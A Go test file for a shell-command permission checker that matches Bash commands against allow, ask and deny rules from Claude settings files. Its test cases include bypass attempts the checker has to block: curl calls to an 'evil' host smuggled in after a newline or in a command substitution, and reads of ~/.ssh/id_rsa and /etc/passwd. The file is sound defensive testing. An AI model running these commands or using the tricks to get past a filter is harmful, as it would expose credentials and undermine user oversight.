package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
)

func TestSplitCommand(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want []string
	}{
		{"simple compound", "npx tsc && pnpm build", []string{"npx tsc", "pnpm build"}},
		{"cd prefix compound", "cd /path && npx tsc", []string{"cd /path", "npx tsc"}},
		{"semicolon", "echo hello; echo world", []string{"echo hello", "echo world"}},
		{"or", "cmd1 || cmd2", []string{"cmd1", "cmd2"}},
		{"simple pipe", "grep error log.txt | wc -l", []string{"grep error log.txt", "wc -l"}},
		{"multi pipe", "cat file | grep err | sort | uniq", []string{"cat file", "grep err", "sort", "uniq"}},
		{"pipe with compound", "grep err log | sort && echo done", []string{"grep err log", "sort", "echo done"}},
		{"subshell", "(npx tsc --noEmit)", []string{"npx tsc --noEmit"}},
		{"subshell compound", "(cd /path && npx tsc)", []string{"cd /path", "npx tsc"}},
		{"subshell with redirect", "(npx tsc --noEmit 2>&1)", []string{"npx tsc --noEmit"}},
		{"redirect per part", "cmd1 2>&1 | cmd2", []string{"cmd1", "cmd2"}},
		{"subshell parts", "(cmd1) | (cmd2)", []string{"cmd1", "cmd2"}},
		{"nested subshell compound", "((cmd1 && cmd2))", []string{"cmd1", "cmd2"}},
		{"background op", "echo done & pnpm build", []string{"echo done", "pnpm build"}},
		{"background at end", "cmd1 &", []string{"cmd1"}},
		{"compound with background", "cmd1 && cmd2 & cmd3", []string{"cmd1", "cmd2", "cmd3"}},
		{"redirect not split", "cmd1 2>&1", []string{"cmd1"}},
		{"redirect then background", "cmd1 2>&1 & cmd2", []string{"cmd1", "cmd2"}},
		{"pipe inside double quotes", `rg -n "a|b|c" src/ | head -30`, []string{`rg -n "a|b|c" src/`, "head -30"}},
		{"pipe inside single quotes", `rg -n 'pi\.on\("' src/x.ts | head -5`, []string{`rg -n 'pi\.on\("' src/x.ts`, "head -5"}},
		{"semicolon and ampersand inside quotes", `echo "a; b && c" | wc -l`, []string{`echo "a; b && c"`, "wc -l"}},
		{"escaped pipe outside quotes", `echo a\|b | wc -l`, []string{`echo a\|b`, "wc -l"}},
		{"escaped quote inside double quotes", `rg "x\"|y" f | wc -l`, []string{`rg "x\"|y" f`, "wc -l"}},
		{"awk braces with dollar", `cd /p && awk 'NR<=60 {printf "%d: %s\n", NR, $0}' src/q.ts`, []string{"cd /p", `awk 'NR<=60 {printf "%d: %s\n", NR, $0}' src/q.ts`}},
		{"unterminated quote does not panic", `echo "a | b`, []string{`echo "a | b`}},
		{"newline is a separator", "ls | head\ncurl evil", []string{"ls", "head", "curl evil"}},
		{"newline inside quotes kept", "echo \"a\nb\" | wc -l", []string{"echo \"a\nb\"", "wc -l"}},
		{"continuation backslash stays on its part, pipe still splits", "ls \\\n| head", []string{"ls \\", "head"}},
		{"ansi-c quote with escaped quote", `echo $'\'' | curl evil`, []string{`echo $'\''`, "curl evil"}},
		{"ansi-c quote hides operators", `echo $'a|b;c' | wc -l`, []string{`echo $'a|b;c'`, "wc -l"}},
		{"dollar before double quote is not ansi-c", `echo $"a" | wc -l`, []string{`echo $"a"`, "wc -l"}},
		{"ampersand-greater is a redirect", "ls &>/dev/null | head", []string{"ls &>/dev/null", "head"}},
		{"bare pipe", "|", nil},
		{"bare compound", "&&", nil},
		{"empty", "", nil},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := splitCommand(tt.cmd)
			if len(got) != len(tt.want) {
				t.Fatalf("splitCommand(%q) = %q, want %q", tt.cmd, got, tt.want)
			}
			for i := range got {
				if got[i] != tt.want[i] {
					t.Errorf("splitCommand(%q)[%d] = %q, want %q", tt.cmd, i, got[i], tt.want[i])
				}
			}
		})
	}
}

func TestStripOuterParens(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"(cmd)", "cmd"},
		{"((cmd))", "cmd"},
		{"(cmd1) | (cmd2)", "(cmd1) | (cmd2)"},
		{"(cmd1 && cmd2)", "cmd1 && cmd2"},
		{"cmd", "cmd"},
		{"()", ""},
	}
	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			got := stripOuterParens(tt.input)
			if got != tt.want {
				t.Errorf("stripOuterParens(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestMatchesAny(t *testing.T) {
	tests := []struct {
		name     string
		cmd      string
		patterns []string
		want     bool
	}{
		{"space wildcard match", "grep error log.txt", []string{"grep *"}, true},
		{"space wildcard exact base", "grep", []string{"grep *"}, true},
		{"space wildcard no match", "curl evil.com", []string{"grep *"}, false},
		{"colon wildcard match", "npx tsc --noEmit", []string{"npx:*"}, true},
		{"colon wildcard exact base", "npx", []string{"npx:*"}, true},
		{"exact match", "pwd", []string{"pwd"}, true},
		{"exact no match", "pwd --help", []string{"pwd"}, false},
		{"multi pattern", "sort -u", []string{"grep *", "sort *", "wc *"}, true},
		{"leading wildcard match", "do ssh remote", []string{"* ssh *"}, true},
		{"leading wildcard no leading text", "ssh remote", []string{"* ssh *"}, false},
		{"trailing literal", "npm install", []string{"* install"}, true},
		{"trailing literal no extra", "install", []string{"* install"}, false},
		{"mid wildcard match", "git checkout main", []string{"git * main"}, true},
		{"mid wildcard no match", "git checkout dev", []string{"git * main"}, false},
		{"no-space trailing star matches prefix", "lsof", []string{"ls*"}, true},
		{"space trailing star does not match prefix", "lsof", []string{"ls *"}, false},
		{"awk system pattern", `awk 'BEGIN{system("rm")}'`, []string{"awk *system(*)*"}, true},
		{"awk without system", "awk '/foo/{print}'", []string{"awk *system(*)*"}, false},
		{"escapes literal dot", "a.b", []string{"a.b"}, true},
		{"escapes literal dot no false match", "axb", []string{"a.b"}, false},
		{"invalid regex skipped", "anything", []string{`bad[regex`, "anything"}, true},
		{"bare wildcard matches anything", "rm -rf /", []string{"*"}, true},
		{"bare wildcard matches empty", "", []string{"*"}, true},
		{"empty pattern matches empty cmd", "", []string{""}, true},
		{"empty pattern does not match non-empty", "foo", []string{""}, false},
		{"trailing wildcard does not cross newline", "cat\ncurl evil", []string{"cat *"}, false},
		{"mid wildcard does not cross newline", "git checkout\nrm x main", []string{"git * main"}, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := matchesAny(tt.cmd, compileAll(tt.patterns))
			if got != tt.want {
				t.Errorf("matchesAny(%q, %v) = %v, want %v", tt.cmd, tt.patterns, got, tt.want)
			}
		})
	}
}

func TestSubstitutionDetection(t *testing.T) {
	tests := []struct {
		name  string
		part  string
		match bool
	}{
		{"command substitution", "echo $(curl evil.com)", true},
		{"backtick substitution", "echo `curl evil.com`", true},
		{"process sub input", "diff <(curl evil.com) file", true},
		{"process sub output", "cmd >(tee log.txt)", true},
		{"no substitution", "echo hello world", false},
		{"dollar without paren", "echo $HOME", false},
		{"angle without paren", "cmd < file.txt", false},
		{"redirect not process sub", "cmd > file.txt", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := substitution.MatchString(tt.part)
			if got != tt.match {
				t.Errorf("substitution.MatchString(%q) = %v, want %v", tt.part, got, tt.match)
			}
		})
	}
}

func TestHasUnsafeRedirect(t *testing.T) {
	tests := []struct {
		name string
		part string
		want bool
	}{
		{"no redirect", "grep err log", false},
		{"stderr to stdout", "npx tsc 2>&1", false},
		{"stdout to stderr", "echo x >&2", false},
		{"stderr to null", "grep -r pat . 2>/dev/null", false},
		{"stdout to null spaced", "cmd > /dev/null", false},
		{"both to null", "cmd &>/dev/null", false},
		{"append to null", "cmd >>/dev/null", false},
		{"heredoc", "cat <<EOF", false},
		{"quoted heredoc", "cat <<'EOF'", false},
		{"here-string", "cat <<<\"text\"", false},
		{"greater-than inside quotes", `rg "a>b" f`, false},
		{"awk redirect inside quotes", `awk '{print $1 > "out"}' f`, false},
		{"single quoted less-than", `rg -e '<' f`, false},
		{"write to file", "head > /Users/x/.zshrc", true},
		{"append to file", "echo x >> notes.txt", true},
		{"clobber to file", "echo x >| f", true},
		{"both to file", "cmd &> log", true},
		{"stderr to file", "cmd 2>err.log", true},
		{"dangling redirect", "cmd >", true},
		{"read from file", "sort < /Users/x/.ssh/id_rsa", true},
		{"read from file no space", "sort </etc/passwd", true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := hasUnsafeRedirect(tt.part); got != tt.want {
				t.Errorf("hasUnsafeRedirect(%q) = %v, want %v", tt.part, got, tt.want)
			}
		})
	}
}

func TestCdTarget(t *testing.T) {
	p := policy{
		home: "/home/u",
		dirs: []string{"/home/u/proj", "/home/u/extra", "/home/u/docs"},
	}
	cwd := "/home/u/proj"
	tests := []struct {
		name string
		part string
		want string
		ok   bool
	}{
		{"relative inside cwd", "cd packages/api", "/home/u/proj/packages/api", true},
		{"dot", "cd .", "/home/u/proj", true},
		{"absolute inside cwd", "cd /home/u/proj/src", "/home/u/proj/src", true},
		{"additional directory", "cd /home/u/extra/x", "/home/u/extra/x", true},
		{"tilde inside allowed", "cd ~/docs", "/home/u/docs", true},
		{"double quoted path with spaces", `cd "/home/u/proj/a b"`, "/home/u/proj/a b", true},
		{"single quoted path", "cd '/home/u/proj/a'", "/home/u/proj/a", true},
		{"parent escape", "cd ../../etc", "", false},
		{"sibling with shared prefix", "cd /home/u/project2", "", false},
		{"absolute outside", "cd /home/u/Library/Keychains", "", false},
		{"bare cd goes home", "cd", "", false},
		{"cd dash", "cd -", "", false},
		{"cd with flag", "cd -P src", "", false},
		{"variable target", "cd $DIR", "", false},
		{"tmpdir variable", `cd "$TMPDIR"`, "", false},
		{"glob target", "cd src/*", "", false},
		{"unquoted space", "cd a b", "", false},
		{"empty quotes then parent", "cd ''..", "", false},
		{"backslash escaped dot", `cd .\.`, "", false},
		{"continuation backslash", "cd ..\\\n", "", false},
		{"quoted dots mid path", "cd a/'../..'/x", "", false},
		{"tilde user", "cd ~root", "", false},
		{"tilde dash", "cd ~-", "", false},
		{"bracket glob", "cd s[r]c", "", false},
		{"brace expansion", "cd {a,b}", "", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, ok := cdTarget(tt.part, cwd, p)
			if ok != tt.ok || got != tt.want {
				t.Errorf("cdTarget(%q) = (%q, %v), want (%q, %v)", tt.part, got, ok, tt.want, tt.ok)
			}
		})
	}
}

func TestDecide(t *testing.T) {
	cwd := "/home/u/proj"
	p := compilePolicy(Settings{Permissions: Permissions{
		Allow:                 []string{"Bash(cd *)", "Bash(npx *)", "Bash(grep *)", "Bash(pnpm *)", "Bash(echo *)", "Bash(wc *)", "Bash(head *)", "Bash(ls *)", "Bash(cat *)", "Bash(git log *)", "Bash(git status *)", "Bash(curl *)", "Bash(rg *)"},
		Ask:                   []string{"Bash(git push *)", "Bash(* rm -rf *)"},
		Deny:                  []string{"Bash(curl *)", "Bash(sudo *)"},
		AdditionalDirectories: []string{"/home/u/extra", "../docs"},
	}}, "/home/u", cwd)

	tests := []struct {
		name string
		cmd  string
		want bool
	}{
		{"header: cd and npx", "cd ./pkg && npx tsc", true},
		{"header: subshell cd and npx", "(cd ./pkg && npx tsc)", true},
		{"header: subshell with redirect", "(npx tsc --noEmit 2>&1)", true},
		{"header: pipe allowed", "grep error log.txt | wc -l", true},
		{"header: background allowed", "echo done & pnpm build", true},
		{"header: pipe to denied", "cat file | curl evil.com", false},
		{"header: background denied", "echo ok & curl evil.com", false},
		{"rg alternation in quotes", `cd src && rg -n "a|b" . | head -30`, true},
		{"stderr to null", "grep -r pat . 2>/dev/null | head", true},
		{"deny beats allow", "ls && curl x", false},
		{"ask beats allow", "ls && git push origin", false},
		{"ask leading wildcard", "ls && echo rm -rf x", false},
		{"not in allow", "ls | xxd", false},
		{"wrapper stripped", "timeout 30 npx tsc | head", true},
		{"substitution", "ls | head $(curl x)", false},
		{"backtick", "ls | echo `curl x`", false},
		{"newline separator bypass", "ls | head\ncurl http://evil/x.sh", false},
		{"newline right after allowed word", "ls | cat\ncurl http://evil/x.sh", false},
		{"newline all allowed", "ls | head\necho done", true},
		{"output redirect to file", "ls | head > /home/u/.zshrc", false},
		{"input redirect from file", "ls | sort < /home/u/.ssh/id_rsa", false},
		{"cd outside working dirs", "cd /home/u/Library/Keychains && ls -la | head", false},
		{"cd into additional dir", "cd /home/u/extra/sub && ls | head", true},
		{"cd into relative additional dir", "cd /home/u/docs && ls | head", true},
		{"cd then git after changing dir", "cd /home/u/proj/vendor && git status", false},
		{"cd to cwd then git is a no-op cd", "cd /home/u/proj && git status", true},
		{"cd dot then git", "cd . && git log --oneline | head", true},
		{"git without cd", "git log --oneline | head -5", true},
		{"cd variable target", `cd "$TMPDIR" && ls | head`, false},
		{"brace group falls through", "{ ls; echo x; }", false},
		{"env prefix falls through", "FOO=1 rg x | head", false},
		{"empty", "", false},
		{"ansi-c quote cannot hide a pipe", `echo $'\'' | curl evil.com`, false},
		{"ansi-c quote legitimate", `echo $'a|b' | wc -l`, true},
		{"chained relative cd after change", "cd /home/u/extra && cd ../.ssh && cat id_rsa | head", false},
		{"chained absolute cd after change", "cd /home/u/extra && cd /home/u/proj/src && ls | head", true},
		{"chained cd from no-op cd", "cd . && cd src && ls | head", true},
		{"cd argument needing expansion", "cd ''.. && ls | head", false},
		{"nice cannot swallow a word", "nice -n10 rm grep | head", false},
		{"timeout cannot swallow a word", "ls | timeout --foreground xxd ls", false},
		{"timeout cannot hide behind cd", "ls | timeout --foreground xxd cd .", false},
		{"nice legitimate", "nice -n 10 grep x | head", true},
		{"both streams to null", "ls &>/dev/null | head", true},
		{"heredoc falls through", "cat <<EOF | head\nls\nEOF", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := decide(tt.cmd, cwd, p); got != tt.want {
				t.Errorf("decide(%q) = %v, want %v", tt.cmd, got, tt.want)
			}
		})
	}
}

func TestDecideCdHonoursDenyAndAsk(t *testing.T) {
	cwd := "/home/u/proj"
	base := Permissions{Allow: []string{"Bash(cd *)", "Bash(ls *)", "Bash(head *)"}}

	denied := base
	denied.Deny = []string{"Bash(cd sub*)"}
	if decide("cd sub && ls | head", cwd, compilePolicy(Settings{Permissions: denied}, "/home/u", cwd)) {
		t.Error("cd matching a deny rule must fall through")
	}

	asked := base
	asked.Ask = []string{"Bash(cd *)"}
	if decide("cd . && ls | head", cwd, compilePolicy(Settings{Permissions: asked}, "/home/u", cwd)) {
		t.Error("cd matching an ask rule must fall through")
	}

	wrapperDenied := base
	wrapperDenied.Deny = []string{"Bash(timeout *)", "Bash(xargs *)"}
	p := compilePolicy(Settings{Permissions: wrapperDenied}, "/home/u", cwd)
	for _, cmd := range []string{"ls | timeout 5 head", "ls | xargs head"} {
		if decide(cmd, cwd, p) {
			t.Errorf("%q: deny rule naming a wrapper must fire before stripping", cmd)
		}
	}
}

func TestExtractBashPatterns(t *testing.T) {
	items := []string{
		"Bash(grep *)",
		"Bash(npx tsc *)",
		"Bash(pwd)",
		"Edit(./**/*.go)",
		"Read(~/.claude/**)",
	}
	got := extractBashPatterns(items)
	want := []string{"grep *", "npx tsc *", "pwd"}
	if len(got) != len(want) {
		t.Fatalf("extractBashPatterns = %v, want %v", got, want)
	}
	for i := range got {
		if got[i] != want[i] {
			t.Errorf("extractBashPatterns[%d] = %q, want %q", i, got[i], want[i])
		}
	}
}

func TestLoadAllSettings(t *testing.T) {
	tmp := t.TempDir()
	home := filepath.Join(tmp, "user")
	userDir := filepath.Join(home, ".claude")
	projDir := filepath.Join(tmp, "project")
	projClaudeDir := filepath.Join(projDir, ".claude")
	for _, d := range []string{userDir, projClaudeDir} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}

	writeSettings(t, filepath.Join(userDir, "settings.json"), Settings{Permissions: Permissions{
		Allow:                 []string{"Bash(grep *)"},
		Ask:                   []string{"Bash(git push *)"},
		Deny:                  []string{"Bash(rm -rf *)"},
		AdditionalDirectories: []string{"/extra"},
	}})
	writeSettings(t, filepath.Join(userDir, "settings.local.json"), Settings{Permissions: Permissions{
		Allow: []string{"Bash(jq *)"},
	}})
	writeSettings(t, filepath.Join(projClaudeDir, "settings.json"), Settings{Permissions: Permissions{
		Allow: []string{"Bash(npm *)"},
	}})
	writeSettings(t, filepath.Join(projClaudeDir, "settings.local.json"), Settings{Permissions: Permissions{
		Allow:                 []string{"Bash(cargo *)"},
		Ask:                   []string{"Bash(brew install *)"},
		Deny:                  []string{"Bash(sudo *)"},
		AdditionalDirectories: []string{"../docs"},
	}})
	managed := filepath.Join(tmp, "managed-settings.json")
	writeSettings(t, managed, Settings{Permissions: Permissions{
		Deny: []string{"Bash(curl *)"},
	}})
	useManagedSettings(t, managed)

	got := loadAllSettings(home, projDir)
	if len(got.Permissions.Allow) != 4 {
		t.Errorf("expected 4 allow rules, got %d: %v", len(got.Permissions.Allow), got.Permissions.Allow)
	}
	if len(got.Permissions.Ask) != 2 {
		t.Errorf("expected 2 ask rules, got %d: %v", len(got.Permissions.Ask), got.Permissions.Ask)
	}
	if len(got.Permissions.Deny) != 3 || got.Permissions.Deny[0] != "Bash(curl *)" {
		t.Errorf("expected managed deny first of 3, got %v", got.Permissions.Deny)
	}
	if len(got.Permissions.AdditionalDirectories) != 2 {
		t.Errorf("expected 2 additional directories, got %v", got.Permissions.AdditionalDirectories)
	}
}

func TestLoadAllSettingsMalformedIsSkipped(t *testing.T) {
	tmp := t.TempDir()
	home := filepath.Join(tmp, "user")
	userDir := filepath.Join(home, ".claude")
	if err := os.MkdirAll(userDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(userDir, "settings.json"), []byte("{not json"), 0o644); err != nil {
		t.Fatal(err)
	}
	writeSettings(t, filepath.Join(userDir, "settings.local.json"), Settings{Permissions: Permissions{
		Allow: []string{"Bash(jq *)"},
	}})
	useManagedSettings(t, filepath.Join(tmp, "absent.json"))
	got := loadAllSettings(home, "")
	if len(got.Permissions.Allow) != 1 {
		t.Errorf("expected malformed file skipped and 1 allow rule, got %v", got.Permissions.Allow)
	}
}

// useManagedSettings points the managed settings path at a test file so the
// machine's real managed-settings.json never leaks into assertions.
func useManagedSettings(t *testing.T, path string) {
	t.Helper()
	orig := managedSettingsPath
	managedSettingsPath = path
	t.Cleanup(func() { managedSettingsPath = orig })
}

func TestStripWrappers(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		{"no wrapper", "npx tsc", "npx tsc"},
		{"timeout duration", "timeout 30 npx tsc", "npx tsc"},
		{"timeout with seconds suffix", "timeout 30s npx tsc", "npx tsc"},
		{"timeout flag and duration", "timeout --preserve-status 5 npx tsc", "npx tsc"},
		{"timeout no duration", "timeout npx tsc", "npx tsc"},
		{"timeout does not swallow the command", "timeout --foreground rm cd", "rm cd"},
		{"timeout signal flag with value", "timeout -s KILL 5 npx tsc", "npx tsc"},
		{"timeout kill-after long flag", "timeout --kill-after=2 5 npx tsc", "npx tsc"},
		{"time bare", "time pnpm build", "pnpm build"},
		{"time -p", "time -p pnpm build", "pnpm build"},
		{"nice bare", "nice pnpm build", "pnpm build"},
		{"nice -n value", "nice -n 10 pnpm build", "pnpm build"},
		{"nice -n attached", "nice -n10 pnpm build", "pnpm build"},
		{"nice negative shorthand", "nice -10 pnpm build", "pnpm build"},
		{"nice --adjustment equals", "nice --adjustment=5 pnpm build", "pnpm build"},
		{"nice does not swallow a bare word", "nice -n10 rm grep", "rm grep"},
		{"nice unknown flag stays in remainder", "nice --foo bar pnpm build", "--foo bar pnpm build"},
		{"nohup", "nohup npm run dev", "npm run dev"},
		{"stdbuf flags", "stdbuf -oL -eL python script.py", "python script.py"},
		{"chained wrappers", "nohup nice timeout 30 npx tsc", "npx tsc"},
		{"bare xargs", "xargs grep pattern", "grep pattern"},
		{"xargs with flag not stripped", "xargs -n1 grep pattern", "xargs -n1 grep pattern"},
		{"xargs followed by long flag not stripped", "xargs --no-run-if-empty rm", "xargs --no-run-if-empty rm"},
		{"only wrapper no command", "nohup", "nohup"},
		{"empty", "", ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := stripWrappers(tt.in)
			if got != tt.want {
				t.Errorf("stripWrappers(%q) = %q, want %q", tt.in, got, tt.want)
			}
		})
	}
}

func TestCompileRulePattern(t *testing.T) {
	tests := []struct {
		pattern string
		want    string
	}{
		{"grep", `^grep$`},
		{"grep *", `^grep(?:[ \t].*)?$`},
		{"grep:*", `^grep(?:[ \t].*)?$`},
		{"ls*", `^ls.*$`},
		{"* install", `^.* install$`},
		{"git * main", `^git .* main$`},
		{"awk *system(*)*", `^awk .*system\(.*\).*$`},
	}
	for _, tt := range tests {
		t.Run(tt.pattern, func(t *testing.T) {
			re, err := compileRulePattern(tt.pattern)
			if err != nil {
				t.Fatalf("compileRulePattern(%q) returned error: %v", tt.pattern, err)
			}
			if re.String() != tt.want {
				t.Errorf("compileRulePattern(%q) = %q, want %q", tt.pattern, re.String(), tt.want)
			}
		})
	}
}

func writeSettings(t *testing.T, path string, s Settings) {
	t.Helper()
	data, err := json.Marshal(s)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, data, 0o644); err != nil {
		t.Fatal(err)
	}
}
